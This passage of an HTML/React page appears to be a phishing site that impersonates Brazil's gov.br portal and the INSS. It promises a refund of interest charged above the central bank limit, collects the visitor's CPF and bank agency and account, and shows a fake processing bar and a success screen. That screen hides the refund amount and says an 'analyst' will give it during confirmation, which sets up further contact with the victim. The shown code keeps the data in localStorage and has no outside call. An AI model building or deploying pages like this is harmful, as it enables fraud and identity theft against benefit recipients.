                                        <span className="font-semibold text-gray-800 text-right">Juros acima do limite BC</span>
                                    </div>
                                </div>
                            </div>

                            

                            <Button onClick={onContinuar}>
                                Continuar
                            </Button>

                            
                        </div>
                    </div>
                </div>
            );
        };

        // Lista de Bancos
        const BANCOS = [
            { codigo: '001', nome: 'Banco do Brasil S.A.' },
            { codigo: '003', nome: 'Banco da Amazônia S.A.' },
            { codigo: '004', nome: 'Banco do Nordeste do Brasil S.A.' },
            { codigo: '007', nome: 'BNDES' },
            { codigo: '012', nome: 'Banco Inbursa S.A.' },
            { codigo: '014', nome: 'State Street Brasil S.A.' },
            { codigo: '017', nome: 'BNY Mellon Banco S.A.' },
            { codigo: '018', nome: 'Banco Tricury S.A.' },
            { codigo: '021', nome: 'Banestes S.A.' },
            { codigo: '024', nome: 'Banco Bandepe S.A.' },
            { codigo: '025', nome: 'Banco Alfa S.A.' },
            { codigo: '029', nome: 'Banco Itaú Consignado S.A.' },
            { codigo: '033', nome: 'Banco Santander (Brasil) S.A.' },
            { codigo: '036', nome: 'Banco Bradesco BBI S.A.' },
            { codigo: '037', nome: 'Banco do Estado do Pará S.A.' },
            { codigo: '040', nome: 'Banco Cargill S.A.' },
            { codigo: '041', nome: 'Banco do Estado do Rio Grande do Sul S.A.' },
            { codigo: '047', nome: 'Banco do Estado de Sergipe S.A.' },
            { codigo: '062', nome: 'Hipercard Banco Múltiplo S.A.' },
            { codigo: '063', nome: 'Banco Bradescard S.A.' },
            { codigo: '064', nome: 'Goldman Sachs do Brasil Banco Múltiplo S.A.' },
            { codigo: '065', nome: 'Banco Andbank (Brasil) S.A.' },
            { codigo: '066', nome: 'Banco Morgan Stanley S.A.' },
            { codigo: '069', nome: 'Banco Crefisa S.A.' },
            { codigo: '070', nome: 'BRB - Banco de Brasília S.A.' },
            { codigo: '074', nome: 'Banco J. Safra S.A.' },
            { codigo: '075', nome: 'Banco ABN AMRO S.A.' },
            { codigo: '076', nome: 'Banco KDB S.A.' },
            { codigo: '077', nome: 'Banco Inter S.A.' },
            { codigo: '078', nome: 'Haitong Banco de Investimento do Brasil S.A.' },
            { codigo: '079', nome: 'Picpay Bank - Banco Múltiplo S.A.' },
            { codigo: '081', nome: 'BancoSeguro S.A.' },
            { codigo: '082', nome: 'Banco Topázio S.A.' },
            { codigo: '083', nome: 'Banco da China Brasil S.A.' },
            { codigo: '085', nome: 'Cooperativa Central de Crédito - AILOS' },
            { codigo: '094', nome: 'Banco Finaxis S.A.' },
            { codigo: '095', nome: 'Banco Travelex S.A.' },
            { codigo: '096', nome: 'Banco B3 S.A.' },
            { codigo: '097', nome: 'Cooperativa Central de Crédito Noroeste Brasileiro' },
            { codigo: '104', nome: 'Caixa Econômica Federal' },
            { codigo: '107', nome: 'Banco BOCOM BBM S.A.' },
            { codigo: '118', nome: 'Standard Chartered Bank (Brasil) S/A' },
            { codigo: '119', nome: 'Banco Western Union do Brasil S.A.' },
            { codigo: '120', nome: 'Banco Rodobens S.A.' },
            { codigo: '121', nome: 'Banco Agibank S.A.' },
            { codigo: '122', nome: 'Banco Bradesco BERJ S.A.' },
            { codigo: '124', nome: 'Banco Woori Bank do Brasil S.A.' },
            { codigo: '125', nome: 'Banco Genial S.A.' },
            { codigo: '126', nome: 'BR Partners Banco de Investimento S.A.' },
            { codigo: '128', nome: 'Braza Bank S.A. Banco de Câmbio' },
            { codigo: '129', nome: 'UBS Brasil Banco de Investimento S.A.' },
            { codigo: '132', nome: 'ICBC do Brasil Banco Múltiplo S.A.' },
            { codigo: '136', nome: 'Unicred do Brasil' },
            { codigo: '139', nome: 'Intesa Sanpaolo Brasil S.A.' },
            { codigo: '144', nome: 'Ebury Banco de Câmbio S.A.' },
            { codigo: '163', nome: 'Commerzbank Brasil S.A.' },
            { codigo: '184', nome: 'Banco Itaú BBA S.A.' },
            { codigo: '204', nome: 'Banco Bradesco Cartões S.A.' },
            { codigo: '208', nome: 'Banco BTG Pactual S.A.' },
            { codigo: '212', nome: 'Banco Original S.A.' },
            { codigo: '213', nome: 'Banco Arbi S.A.' },
            { codigo: '217', nome: 'Banco John Deere S.A.' },
            { codigo: '218', nome: 'Banco BS2 S.A.' },
            { codigo: '222', nome: 'Banco Credit Agricole Brasil S.A.' },
            { codigo: '224', nome: 'Banco Fibra S.A.' },
            { codigo: '233', nome: 'Banco BMG Soluções Financeiras S.A.' },
            { codigo: '237', nome: 'Banco Bradesco S.A.' },
            { codigo: '241', nome: 'Banco Clássico S.A.' },
            { codigo: '243', nome: 'Banco Master S.A.' },
            { codigo: '246', nome: 'Banco ABC Brasil S.A.' },
            { codigo: '249', nome: 'Banco Investcred Unibanco S.A.' },
            { codigo: '250', nome: 'BCV - Banco de Crédito e Varejo S.A.' },
            { codigo: '254', nome: 'Paraná Banco S.A.' },
            { codigo: '265', nome: 'Banco Fator S.A.' },
            { codigo: '266', nome: 'Banco Cédula S.A.' },
            { codigo: '276', nome: 'Banco Senff S.A.' },
            { codigo: '299', nome: 'Banco Afinz S.A. Banco Múltiplo' },
            { codigo: '318', nome: 'Banco BMG S.A.' },
            { codigo: '320', nome: 'Bank Of China (Brasil) Banco Múltiplo S.A.' },
            { codigo: '329', nome: 'QI Sociedade de Crédito Direto S.A.' },
            { codigo: '330', nome: 'Banco Bari de Investimentos e Financiamentos S/A' },
            { codigo: '341', nome: 'Itaú Unibanco S.A.' },
            { codigo: '348', nome: 'Banco XP S.A.' },
            { codigo: '366', nome: 'Banco Société Générale Brasil S.A.' },
            { codigo: '370', nome: 'Banco Mizuho do Brasil S.A.' },
            { codigo: '376', nome: 'Banco J. P. Morgan S.A.' },
            { codigo: '389', nome: 'Banco Mercantil do Brasil S.A.' },
            { codigo: '394', nome: 'Banco Bradesco Financiamentos S.A.' },
            { codigo: '422', nome: 'Banco Safra S.A.' },
            { codigo: '456', nome: 'Banco MUFG Brasil S.A.' },
            { codigo: '464', nome: 'Banco Sumitomo Mitsui Brasileiro S.A.' },
            { codigo: '473', nome: 'Banco Caixa Geral - Brasil S.A.' },
            { codigo: '477', nome: 'Citibank N.A.' },
            { codigo: '479', nome: 'Banco ItauBank S.A' },
            { codigo: '487', nome: 'Deutsche Bank S.A. - Banco Alemão' },
            { codigo: '505', nome: 'Banco UBS (Brasil) S.A.' },
            { codigo: '600', nome: 'Banco Luso Brasileiro S.A.' },
            { codigo: '604', nome: 'Banco Industrial do Brasil S.A.' },
            { codigo: '610', nome: 'Banco VR S.A.' },
            { codigo: '611', nome: 'Banco Paulista S.A.' },
            { codigo: '612', nome: 'Banco Guanabara S.A.' },
            { codigo: '623', nome: 'Banco PAN S.A.' },
            { codigo: '626', nome: 'Banco C6 Consignado S.A.' },
            { codigo: '630', nome: 'Banco Bluebank S.A.' },
            { codigo: '633', nome: 'Banco Rendimento S.A.' },
            { codigo: '634', nome: 'Banco Triângulo S.A.' },
            { codigo: '637', nome: 'Banco Sofisa S.A.' },
            { codigo: '641', nome: 'Banco Alvorada S.A.' },
            { codigo: '643', nome: 'Banco Pine S.A.' },
            { codigo: '652', nome: 'Itaú Unibanco Holding S.A.' },
            { codigo: '653', nome: 'Banco Pleno S.A.' },
            { codigo: '654', nome: 'Banco Digimais S.A.' },
            { codigo: '655', nome: 'Banco Votorantim S.A.' },
            { codigo: '707', nome: 'Banco Daycoval S.A.' },
            { codigo: '739', nome: 'Banco Cetelem S.A.' },
            { codigo: '741', nome: 'Banco Ribeirão Preto S.A.' },
            { codigo: '743', nome: 'Banco Semear S.A.' },
            { codigo: '745', nome: 'Banco Citibank S.A.' },
            { codigo: '746', nome: 'Banco Modal S.A.' },
            { codigo: '747', nome: 'Banco Rabobank International Brasil S.A.' },
            { codigo: '748', nome: 'Banco Cooperativo Sicredi S.A.' },
            { codigo: '752', nome: 'Banco BNP Paribas Brasil S.A.' },
            { codigo: '755', nome: 'Bank of America Merrill Lynch Banco Múltiplo S.A.' },
            { codigo: '756', nome: 'Banco Cooperativo Sicoob S.A.' },
            { codigo: '757', nome: 'Banco KEB HANA do Brasil S.A.' }
        ];

        // Máscara de Agência
        const formatarAgencia = (valor) => {
            return valor.replace(/\D/g, '').substring(0, 4);
        };

        // Máscara de Conta
        const formatarConta = (valor) => {
            valor = valor.replace(/\D/g, '');
            if (valor.length > 10) {
                valor = valor.substring(0, 10);
            }
            if (valor.length > 1) {
                const digitos = valor.substring(0, valor.length - 1);
                const dv = valor.substring(valor.length - 1);
                return digitos + '-' + dv;
            }
            return valor;
        };

        // Calcular dias úteis
        const calcularDiasUteis = (dataInicial, diasUteis) => {
            const data = new Date(dataInicial);
            let diasAdicionados = 0;

            while (diasAdicionados < diasUteis) {
                data.setDate(data.getDate() + 1);
                const diaSemana = data.getDay();
                if (diaSemana !== 0 && diaSemana !== 6) {
                    diasAdicionados++;
                }
            }

            return data;
        };

        // Tela 5: Dados Bancários
        const TelaDadosBancarios = ({ banco, setBanco, agencia, setAgencia, conta, setConta, onContinuar }) => {
            const [erroBanco, setErroBanco] = useState('');
            const [erroAgencia, setErroAgencia] = useState('');
            const [erroConta, setErroConta] = useState('');
            const [buscaBanco, setBuscaBanco] = useState('');
            const [mostrarLista, setMostrarLista] = useState(false);

            const bancosFiltrados = BANCOS.filter(b => {
                const termo = buscaBanco.toLowerCase();
                return b.codigo.includes(termo) || b.nome.toLowerCase().includes(termo);
            });

            const handleBancoClick = (codigoBanco) => {
                setBanco(codigoBanco);
                const bancoSelecionado = BANCOS.find(b => b.codigo === codigoBanco);
                setBuscaBanco(bancoSelecionado ? `${bancoSelecionado.codigo} - ${bancoSelecionado.nome}` : '');
                setMostrarLista(false);
                setErroBanco('');
            };

            const handleBuscaChange = (e) => {
                setBuscaBanco(e.target.value);
                setMostrarLista(true);
                if (!e.target.value) {
                    setBanco('');
                }
            };

            const handleBuscaFocus = () => {
                setMostrarLista(true);
            };

            const handleBuscaBlur = () => {
                setTimeout(() => setMostrarLista(false), 200);
            };

            const handleInputClick = () => {
                if (banco) {
                    setBanco('');
                    setBuscaBanco('');
                    setMostrarLista(true);
                }
            };

            const handleAgenciaChange = (e) => {
                const valor = formatarAgencia(e.target.value);
                setAgencia(valor);
                setErroAgencia(valor.length > 0 && valor.length < 4 ? 'Agência deve ter 4 dígitos.' : '');
            };

            const handleContaChange = (e) => {
                const valor = formatarConta(e.target.value);
                setConta(valor);
                setErroConta(valor.replace(/\D/g, '').length > 0 && valor.replace(/\D/g, '').length < 2 ? 'Conta inválida.' : '');
            };

            const handleContinuar = () => {
                if (!banco) {
                    setErroBanco('Selecione um banco.');
                    return;
                }
                if (agencia.length !== 4) {
                    setErroAgencia('Agência deve ter 4 dígitos.');
                    return;
                }
                if (conta.replace(/\D/g, '').length < 2) {
                    setErroConta('Conta inválida.');
                    return;
                }
                onContinuar();
            };

            const dadosValidos = banco && agencia.length === 4 && conta.replace(/\D/g, '').length >= 2;

            return (
                <div className="page-container">
                    <HeaderGovBr titulo="Dados Bancários" />
                    <div className="min-h-screen bg-gray-50">
                        <div className="max-w-md mx-auto px-6 py-8">
                            <h2 className="text-xl font-bold text-gray-800 mb-2">Informes seus dados bancários</h2>
                            <p className="text-sm text-gray-600 mb-6">Para que possamos creditar o valor da restituição</p>

                            <div className="space-y-4">
                                {/* Seletor de Banco com Busca */}
                                <div>
                                    <label className="block text-gray-700 text-sm font-semibold mb-2">Banco</label>
                                    <div className="relative">
                                        <input
                                            type="text"
                                            value={buscaBanco}
                                            onChange={handleBuscaChange}
                                            onFocus={handleBuscaFocus}
                                            onBlur={handleBuscaBlur}
                                            onClick={handleInputClick}
                                            placeholder="Digite o nome ou código do banco"
                                            className={`input-govbr w-full ${erroBanco ? 'border-red-500 focus:border-red-500' : banco ? 'border-govbr-blue' : ''}`}
                                            style={{ paddingRight: '3rem', cursor: banco ? 'pointer' : 'text' }}
                                        />
                                        
                                        {/* Ícone de busca/check */}
                                        <div className="absolute right-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
                                            {banco ? (
                                                <svg className="w-5 h-5 text-govbr-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
                                                </svg>
                                            ) : (
                                                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                                                </svg>
                                            )}
                                        </div>

                                        {/* Lista de resultados */}
                                        {mostrarLista && buscaBanco && (
                                            <div className="absolute z-50 w-full mt-2 bg-white rounded-lg shadow-xl border-2 border-govbr-blue/20 max-h-72 overflow-y-auto">
                                                {bancosFiltrados.length > 0 ? (
                                                    bancosFiltrados.map(b => (
                                                        <div
                                                            key={b.codigo}
                                                            onClick={() => handleBancoClick(b.codigo)}
                                                            className="px-4 py-3 hover:bg-govbr-blue/5 cursor-pointer border-b border-gray-100 last:border-b-0 transition-all active:bg-govbr-blue/10"
                                                        >
                                                            <div className="flex items-center gap-3">
                                                                <span className="font-bold text-govbr-blue text-sm min-w-[3rem] bg-govbr-blue/10 px-2 py-1 rounded">{b.codigo}</span>
                                                                <span className="text-gray-700 text-sm leading-tight flex-1">{b.nome}</span>
                                                            </div>
                                                        </div>
                                                    ))
                                                ) : (
                                                    <div className="px-5 py-8 text-center">
                                                        <svg className="w-12 h-12 text-gray-300 mx-auto mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                                                        </svg>
                                                        <p className="text-gray-500 text-sm font-medium">Nenhum banco encontrado</p>
                                                        <p className="text-gray-400 text-xs mt-1">Tente outro termo de busca</p>
                                                    </div>
                                                )}
                                            </div>
                                        )}
                                    </div>
                                    
                                    {erroBanco && <p className="text-red-600 text-sm mt-1 font-medium">{erroBanco}</p>}
                                    {banco && !erroBanco && (
                                        <p className="text-govbr-blue text-xs mt-2 flex items-center gap-1">
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
                                            </svg>
                                            {BANCOS.find(b => b.codigo === banco)?.nome}
                                        </p>
                                    )}
                                </div>

                                <InputField
                                    label="Agência"
                                    value={agencia}
                                    onChange={handleAgenciaChange}
                                    error={erroAgencia}
                                    placeholder="0000"
                                    maxLength={4}
                                />

                                <InputField
                                    label="Conta com dígito"
                                    value={conta}
                                    onChange={handleContaChange}
                                    error={erroConta}
                                    placeholder="00000-0"
                                    maxLength={11}
                                />

                                <div className="pt-4">
                                    <Button onClick={handleContinuar} disabled={!dadosValidos}>
                                        Solicitar Restituição
                                    </Button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            );
        };

        // Tela 6: Progresso (Simplificada e Moderna)
        const TelaProgresso = ({ onComplete }) => {
            const [progresso, setProgresso] = useState(0);

            useEffect(() => {
                const interval = setInterval(() => {
                    setProgresso(prev => {
                        if (prev >= 100) {
                            clearInterval(interval);
                            setTimeout(onComplete, 500);
                            return 100;
                        }
                        return prev + 1;
                    });
                }, 80);

                return () => clearInterval(interval);
            }, []);

            return (
                <div className="page-container min-h-screen bg-gray-50 flex items-center justify-center px-6">
                    <div className="w-full max-w-md text-center">
                        {/* Logo */}
                        <div className="flex justify-center mb-10">
                            <img src="inss.png" alt="INSS" className="h-16 w-auto" />
                        </div>

                        {/* Título */}
                        <div className="mb-10">
                            <h2 className="text-2xl font-bold text-gray-800 mb-2">
                                Processando Solicitação
                            </h2>
                            <p className="text-gray-600 text-sm">
                                Aguarde enquanto validamos seus dados
                            </p>
                        </div>

                        {/* Barra de Progresso Principal */}
                        <div className="mb-8">
                            <div className="flex justify-between items-center mb-4">
                                <span className="text-sm font-medium text-gray-700">Progresso</span>
                                <span className="text-2xl font-bold text-govbr-blue">{progresso}%</span>
                            </div>
                            
                            {/* Barra com animação */}
                            <div className="relative w-full h-3 bg-gray-200 rounded-full overflow-hidden">
                                <div 
                                    className="absolute h-full bg-gradient-to-r from-govbr-blue via-blue-500 to-govbr-blue transition-all duration-300 ease-out rounded-full"
                                    style={{ 
                                        width: `${progresso}%`,
                                        backgroundSize: '200% 100%',
                                        animation: 'shimmer 2s infinite'
                                    }}
                                ></div>
                            </div>
                        </div>

                        
                    </div>
                </div>
            );
        };

        // Tela 7: Conclusão
        const TelaConclusao = ({ banco, agencia, conta, previsaoCredito }) => {
            const dataPrevisao = previsaoCredito ? new Date(previsaoCredito) : calcularDiasUteis(new Date(), 7);
            const bancoInfo = BANCOS.find(b => b.codigo === banco);

            return (
                <div className="page-container">
                    <HeaderGovBr titulo="Concluído" />
                    <div className="min-h-screen bg-gray-50">
                        <div className="max-w-md mx-auto px-6 py-8">
                            <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-200 mb-6 text-center">
                                <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                    <svg width="40" height="40" viewBox="0 0 24 24" fill="#168821">
                                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                                    </svg>
                                </div>
                                <h2 className="text-2xl font-bold text-gray-800 mb-2">Solicitação Concluída!</h2>
                                <p className="text-gray-600">Restituição de juros processada com sucesso</p>
                            </div>

                            <div className="bg-gradient-to-br from-govbr-blue to-blue-700 rounded-2xl p-6 text-white mb-6">
                                <p className="text-sm opacity-90 mb-1">Valor da Restituição</p>
                                <p className="text-4xl font-bold mb-2">Oculto</p>
                                <p className="text-xs opacity-75 mb-4">Informado pelo analista durante confirmação</p>
                                
                                <div className="border-t border-white/20 pt-4">
                                    <p className="text-sm opacity-90 mb-2">Previsão de Crédito</p>
                                    <p className="text-xl font-bold">{formatarData(dataPrevisao)}</p>
                                </div>
                            </div>

                            <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-200 mb-6">
                                <h3 className="font-semibold text-gray-800 mb-4">Dados Bancários</h3>
                                <div className="space-y-3 text-sm">
                                    <div className="flex justify-between py-2 border-b border-gray-100">
                                        <span className="text-gray-600">Banco:</span>
                                        <span className="font-medium text-gray-800">{bancoInfo ? bancoInfo.nome : banco}</span>
                                    </div>
                                    <div className="flex justify-between py-2 border-b border-gray-100">
                                        <span className="text-gray-600">Agência:</span>
                                        <span className="font-medium text-gray-800">{agencia}</span>
                                    </div>
                                    <div className="flex justify-between py-2">
                                        <span className="text-gray-600">Conta:</span>
                                        <span className="font-medium text-gray-800">{conta}</span>
                                    </div>
                                </div>
                            </div>

                            

                            

                            {/* Logos Gov.br na parte inferior */}
                            <div className="mt-8 pt-6 border-t border-gray-200">
                                <div className="flex items-center justify-center gap-6">
                                    <img src="govbr.png" alt="gov.br" className="h-8 w-auto opacity-70" />
                                    <div className="h-8 w-px bg-gray-300"></div>
                                    <img src="govlogo.png" alt="Governo Federal" className="h-10 w-auto opacity-70" />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            );
        };

        // ========== GERENCIAMENTO DE DADOS ==========
        const STORAGE_KEY = 'inss_restituicoes';

        const salvarRestituicao = (cpf, banco, agencia, conta) => {
            try {
                const restituicoes = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
                const dataPrevisao = calcularDiasUteis(new Date(), 7);
                const novaRestituicao = {
                    cpf: cpf.replace(/\D/g, ''),
                    banco,
                    agencia,
                    conta,
                    dataPrevisao: dataPrevisao.toISOString(),
                    dataSolicitacao: new Date().toISOString()
                };
                
                // Remove solicitação anterior do mesmo CPF, se existir
                const restituicoesAtualizadas = restituicoes.filter(r => r.cpf !== cpf.replace(/\D/g, ''));
                restituicoesAtualizadas.push(novaRestituicao);
                
                localStorage.setItem(STORAGE_KEY, JSON.stringify(restituicoesAtualizadas));
                return true;
            } catch (error) {
                console.error('Erro ao salvar restituição:', error);
                return false;
            }
        };

        const buscarRestituicao = (cpf) => {
            try {
                const restituicoes = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
                const cpfLimpo = cpf.replace(/\D/g, '');
                return restituicoes.find(r => r.cpf === cpfLimpo);
            } catch (error) {
                console.error('Erro ao buscar restituição:', error);
                return null;
            }
        };

        // ========== APP PRINCIPAL ==========
        const App = () => {
            const [etapa, setEtapa] = useState(1);
            // 1: Inicial, 2: Identificação CPF, 3: Loading CPF, 4: Aviso Restituição
            // 5: Valores Disponíveis, 6: Dados Bancários, 7: Progresso, 8: Conclusão
            const [cpf, setCpf] = useState('');
            const [banco, setBanco] = useState('');
            const [agencia, setAgencia] = useState('');
            const [conta, setConta] = useState('');
            const [restituicaoExistente, setRestituicaoExistente] = useState(null);
            const [mostrarNotificacao, setMostrarNotificacao] = useState(false);

            const handleEntrarGovBr = () => {
                setEtapa(2);
            };

            const handleContinuarCPF = () => {
                // Verifica se já existe restituição para este CPF
                const restituicao = buscarRestituicao(cpf);
                setRestituicaoExistente(restituicao);
                setEtapa(3);
            };

            const handleLoadingCPFComplete = () => {
                // Se já existe restituição, pula direto para conclusão
                if (restituicaoExistente) {
                    setBanco(restituicaoExistente.banco);
                    setAgencia(restituicaoExistente.agencia);
                    setConta(restituicaoExistente.conta);
                    setEtapa(8);
                } else {
                    setEtapa(4);
                }
            };

            const handleContinuarAviso = () => {
                setEtapa(5);
            };

            const handleContinuarValores = () => {
                setEtapa(6);
            };

            const handleContinuarDadosBancarios = () => {
                setEtapa(7);
            };

            const handleProgressoComplete = () => {
                // Salva a restituição no localStorage
                salvarRestituicao(cpf, banco, agencia, conta);
                setEtapa(8);
            };

            const handleVoltar = () => {
                if (etapa === 2) setEtapa(1);
            };

            // Loading entre etapas
            useEffect(() => {
                if (etapa === 3) {
                    const timer = setTimeout(() => {
                        handleLoadingCPFComplete();
                    }, 5000);
                    return () => clearTimeout(timer);
                }
            }, [etapa]);

            return (
                <div className="min-h-screen bg-white">
                    <div className="max-w-md mx-auto">
                        {etapa === 1 && <TelaInicial onEntrar={handleEntrarGovBr} />}
                        {etapa === 2 && (
                            <TelaIdentificacao 
                                cpf={cpf}
                                setCpf={setCpf}
                                onContinuar={handleContinuarCPF}
                                onVoltar={handleVoltar}
                            />
                        )}
                        {etapa === 3 && <LoadingScreen mensagem="Verificando seus dados..." submensagem="Aguarde enquanto validamos seus dados" />}
                        {etapa === 4 && (
                            <TelaAvisoRestituicao 
                                cpf={cpf}
                                onContinuar={handleContinuarAviso}
                            />
                        )}
                        {etapa === 5 && (
                            <TelaValoresDisponiveis 
                                onContinuar={handleContinuarValores}
                                mostrarNotificacao={mostrarNotificacao}
                                setMostrarNotificacao={setMostrarNotificacao}
                            />
                        )}
                        {etapa === 6 && (
                            <TelaDadosBancarios 
                                banco={banco}
                                setBanco={setBanco}
                                agencia={agencia}
                                setAgencia={setAgencia}
                                conta={conta}
                                setConta={setConta}
                                onContinuar={handleContinuarDadosBancarios}
                            />
                        )}
                        {etapa === 7 && <TelaProgresso onComplete={handleProgressoComplete} />}
                        {etapa === 8 && (
                            <TelaConclusao 
                                banco={banco}
                                agencia={agencia}
                                conta={conta}
                                previsaoCredito={restituicaoExistente?.dataPrevisao}
                            />
                        )}
                    </div>
                </div>
            );
        };

        // Renderização
        ReactDOM.render(<App />, document.getElementById('root'));
    </script>
</body>
</html>
